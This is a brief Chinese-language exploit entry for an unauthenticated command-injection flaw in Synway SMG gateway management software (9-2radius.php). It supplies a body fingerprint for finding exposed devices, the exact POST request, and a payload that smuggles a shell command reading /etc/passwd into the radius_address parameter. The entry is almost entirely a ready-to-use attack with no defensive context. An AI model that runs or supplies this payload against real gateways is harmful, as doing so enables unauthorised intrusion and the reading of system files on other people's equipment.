# 三汇SMG网关管理软件9-2radius.php未授权RCE漏洞

三汇SMG网关管理软件9-2radius.php ｜ 命令执行 ｜ —
- **指纹**：`body="text ml10 mr20"`
- **请求**：`POST /en/9-2radius.php?authority=6 HTTP/1.1`

**Payload**
```
save=1&enable_radius=1&radius_address=/';cat /etc/passwd;+#
```
- **响应特征**：500